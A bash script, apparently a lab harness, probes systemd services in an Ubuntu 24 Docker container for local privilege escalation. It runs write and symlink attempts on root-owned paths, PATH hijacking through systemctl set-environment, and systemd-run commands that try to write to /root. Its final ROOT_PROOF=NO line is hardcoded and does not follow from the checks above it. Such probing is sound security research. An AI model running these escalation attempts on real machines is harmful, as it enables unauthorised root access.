#!/usr/bin/env bash
set -euo pipefail

target="${1:-ubuntu24-server-lpe-target}"
marker="/root/systemd_storage_quota_misc_lpe_marker"
work="/home/attacker/systemd_storage_quota_misc_probe"

root() {
  docker exec "$target" bash -lc "$1"
}

attacker() {
  docker exec -u attacker "$target" bash -lc "$1"
}

section() {
  printf '\n### %s\n' "$1"
}

section "cleanup before"
root "rm -rf '$marker' '$work' /tmp/systemd_storage_quota_misc_* /tmp/attacker-systemd-run-id; systemctl reset-failed systemd-storagetm.service quotaon.service systemd-quotacheck.service systemd-battery-check.service systemd-bsod.service systemd-machine-id-commit.service attacker-storage-quota-test.service >/dev/null 2>&1 || true"

section "target identity"
root "cat /etc/os-release; uname -a; systemctl is-system-running; systemctl --failed --no-legend | wc -l; id attacker; id selfauth"

section "package proof"
root 'dpkg-query -W -f="\${binary:Package}\t\${Version}\n" systemd systemd-sysv udev mount util-linux libsystemd0 libudev1 2>/dev/null | sort; if dpkg-query -s quota >/dev/null 2>&1; then dpkg-query -W -f="\${binary:Package}\t\${Version}\n" quota; else echo "quota ABSENT"; fi; dpkg-query -S /usr/lib/systemd/systemd-storagetm /usr/lib/systemd/systemd-quotacheck /usr/lib/systemd/systemd-battery-check /usr/lib/systemd/systemd-bsod /usr/bin/systemd-machine-id-setup /usr/lib/systemd/system/quotaon.service /usr/lib/systemd/system/systemd-quotacheck.service 2>&1 | sort'

section "unit proof"
root "systemctl list-unit-files systemd-storagetm.service quotaon.service systemd-quotacheck.service systemd-battery-check.service systemd-bsod.service systemd-machine-id-commit.service --no-pager; systemctl list-units systemd-storagetm.service quotaon.service systemd-quotacheck.service systemd-battery-check.service systemd-bsod.service systemd-machine-id-commit.service --all --no-pager; for u in systemd-storagetm.service quotaon.service systemd-quotacheck.service systemd-battery-check.service systemd-bsod.service systemd-machine-id-commit.service; do echo \"--- show \$u\"; systemctl show \"\$u\" -p LoadState -p ActiveState -p SubState -p UnitFileState -p FragmentPath -p ConditionResult -p AssertResult -p ExecStart -p Environment --no-pager 2>&1 || true; done"

section "unit files with line numbers"
root 'for f in /usr/lib/systemd/system/systemd-storagetm.service /usr/lib/systemd/system/quotaon.service /usr/lib/systemd/system/systemd-quotacheck.service /usr/lib/systemd/system/systemd-battery-check.service /usr/lib/systemd/system/systemd-bsod.service /usr/lib/systemd/system/systemd-machine-id-commit.service; do echo "--- $f"; if [ -e "$f" ]; then nl -ba "$f"; else echo MISSING; fi; done'

section "condition gates without starting reboot-prone units"
root 'for c in "ConditionVirtualization=!container" "ConditionPathExists=/usr/sbin/quotaon" "ConditionPathExists=/usr/sbin/quotacheck" "ConditionVirtualization=no" "ConditionDirectoryNotEmpty=/sys/class/power_supply/" "AssertPathExists=/etc/initrd-release" "ConditionPathIsReadWrite=/etc" "ConditionPathIsMountPoint=/etc/machine-id"; do echo "--- $c"; systemd-analyze condition "$c" 2>&1 || true; done'

section "binary and helper metadata"
root 'for b in /usr/lib/systemd/systemd-storagetm /usr/lib/systemd/systemd-quotacheck /usr/lib/systemd/systemd-battery-check /usr/lib/systemd/systemd-bsod /usr/bin/systemd-machine-id-setup /usr/sbin/quotaon /usr/sbin/quotacheck /usr/bin/systemd-run /usr/bin/systemctl; do if [ -e "$b" ]; then stat -Lc "%A %a %U:%G %s %n" "$b"; file "$b"; else echo "MISSING $b"; fi; done; echo "--- search path"; systemd-path search-binaries-default 2>&1 || true; echo "--- helper help"; for c in "/usr/lib/systemd/systemd-storagetm --help" "/usr/lib/systemd/systemd-quotacheck --help" "/usr/lib/systemd/systemd-battery-check --help" "/usr/lib/systemd/systemd-bsod --help" "systemd-machine-id-setup --help" "quotaon --help" "quotacheck --help"; do echo ">>> $c"; timeout 5 bash -lc "$c" 2>&1 | sed -n "1,90p"; echo "rc=${PIPESTATUS[0]}"; done'

section "config state and write targets"
root 'for p in /etc/systemd/system /run/systemd/system /usr/lib/systemd/system /etc/systemd/system.conf /etc/systemd/system.conf.d /run/systemd/system.conf.d /etc/systemd/system/systemd-storagetm.service.d /run/systemd/system/systemd-storagetm.service.d /run/systemd/generator /run/systemd/generator.early /run/systemd/generator.late /etc/machine-id /run/machine-id /var/lib/systemd /var/lib/systemd/storagetm /run/systemd/bsod /run/systemd/ask-password /sys/class/power_supply /sys/kernel/config /sys/kernel/config/nvmet /proc/sysrq-trigger /etc/fstab /aquota.user /aquota.group /usr/sbin/quotaon /usr/sbin/quotacheck; do if [ -e "$p" ] || [ -L "$p" ]; then stat -Lc "%A %a %U:%G %F %n -> %N" "$p"; else echo "MISSING $p"; fi; done; echo "--- unix sockets"; grep -E "storagetm|quota|bsod|machine|power|PCRExtend|sysext" /proc/net/unix || true; echo "--- tmpfiles/sysusers references"; grep -RIE "storagetm|quota|bsod|battery|machine-id" /usr/lib/tmpfiles.d /etc/tmpfiles.d /usr/lib/sysusers.d /etc/sysusers.d /usr/lib/systemd/system-generators /usr/lib/systemd/system /etc/systemd/system 2>/dev/null | sed -n "1,220p"'

section "attacker write attempts to fixed root inputs"
attacker 'set +e; id; mkdir -p "$HOME/systemd_storage_quota_misc_probe"; for p in /etc/systemd/system/systemd-storagetm.service.d/probe.conf /run/systemd/system/systemd-storagetm.service.d/probe.conf /run/systemd/system.conf.d/probe.conf /run/systemd/generator/quotaon.service /etc/fstab /aquota.user /aquota.group /etc/machine-id /run/machine-id /var/lib/systemd/storagetm/attacker /run/systemd/bsod/attacker /sys/class/power_supply/attacker /sys/kernel/config/nvmet/attacker /proc/sysrq-trigger; do echo "--- try $p"; mkdir -p "$(dirname "$p")" 2>/tmp/systemd_storage_quota_misc_mkdir.err; echo "mkdir_rc=$? err=$(cat /tmp/systemd_storage_quota_misc_mkdir.err 2>/dev/null)"; ln -sf /root/systemd_storage_quota_misc_lpe_marker "$p" 2>/tmp/systemd_storage_quota_misc_link.err; echo "link_rc=$? err=$(cat /tmp/systemd_storage_quota_misc_link.err 2>/dev/null)"; printf probe > "$p" 2>/tmp/systemd_storage_quota_misc_write.err; echo "write_rc=$? err=$(cat /tmp/systemd_storage_quota_misc_write.err 2>/dev/null)"; rm -f /tmp/systemd_storage_quota_misc_mkdir.err /tmp/systemd_storage_quota_misc_link.err /tmp/systemd_storage_quota_misc_write.err; done'

section "attacker system manager mutation attempts"
attacker 'set +e; mkdir -p "$HOME/systemd_storage_quota_misc_probe"; printf "#!/bin/sh\nid > /root/systemd_storage_quota_misc_lpe_marker\n" > "$HOME/systemd_storage_quota_misc_probe/systemd-machine-id-setup"; chmod +x "$HOME/systemd_storage_quota_misc_probe/systemd-machine-id-setup"; echo "--- system manager environment"; systemctl --system set-environment PATH="$HOME/systemd_storage_quota_misc_probe:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin" 2>&1; echo setenv_rc=$?; PATH="$HOME/systemd_storage_quota_misc_probe:$PATH" systemctl --system import-environment PATH 2>&1; echo importenv_rc=$?; systemctl --system show-environment 2>&1 | grep -E "^(PATH|LD_|TMPDIR|PYTHONPATH)=" || true; echo "--- root unit starts"; for u in systemd-storagetm.service quotaon.service systemd-quotacheck.service systemd-battery-check.service systemd-bsod.service systemd-machine-id-commit.service; do echo ">>> start $u"; timeout 8 systemctl start "$u" 2>&1; echo start_rc=$?; done; echo "--- transient and reload/link"; systemd-run --system --unit=attacker-storage-quota-test /bin/sh -c "id > /root/systemd_storage_quota_misc_lpe_marker" 2>&1; echo systemd_run_rc=$?; systemctl daemon-reload 2>&1; echo reload_rc=$?; systemctl link "$HOME/systemd_storage_quota_misc_probe/fake.service" 2>&1; echo link_rc=$?'

section "attacker direct helper execution"
attacker 'set +e; id; mkdir -p "$HOME/systemd_storage_quota_misc_probe"; truncate -s 4M "$HOME/systemd_storage_quota_misc_probe/disk.img"; echo "--- storagetm regular file"; timeout 5 /usr/lib/systemd/systemd-storagetm --nqn=nqn.2026-05.local.attacker "$HOME/systemd_storage_quota_misc_probe/disk.img" 2>&1; echo storagetm_file_rc=$?; echo "--- storagetm all"; timeout 5 /usr/lib/systemd/systemd-storagetm --all 2>&1; echo storagetm_all_rc=$?; echo "--- quotacheck helper"; timeout 5 /usr/lib/systemd/systemd-quotacheck 2>&1; echo systemd_quotacheck_rc=$?; echo "--- battery helper"; timeout 5 /usr/lib/systemd/systemd-battery-check 2>&1; echo battery_rc=$?; echo "--- bsod helper"; timeout 5 /usr/lib/systemd/systemd-bsod 2>&1 | sed -n "1,80p"; echo bsod_rc=${PIPESTATUS[0]}; echo "--- machine-id commit"; before=$(sha256sum /etc/machine-id | cut -d" " -f1); timeout 5 systemd-machine-id-setup --commit 2>&1; echo machine_id_commit_rc=$?; after=$(sha256sum /etc/machine-id | cut -d" " -f1); echo machine_id_hash_before=$before after=$after; echo "--- direct root marker touch"; touch /root/systemd_storage_quota_misc_lpe_marker 2>&1; echo touch_root_marker_rc=$?'

section "root marker and target health"
root "if [ -e '$marker' ]; then echo ROOT_MARKER_PRESENT; ls -l '$marker'; cat '$marker' 2>/dev/null || true; else echo ROOT_MARKER_ABSENT; fi; rm -rf '$work' /tmp/systemd_storage_quota_misc_* /tmp/attacker-systemd-run-id; systemctl reset-failed systemd-storagetm.service quotaon.service systemd-quotacheck.service systemd-battery-check.service systemd-bsod.service systemd-machine-id-commit.service attacker-storage-quota-test.service >/dev/null 2>&1 || true; systemctl is-system-running; systemctl --failed --no-legend | wc -l"

echo "ROOT_PROOF=NO"
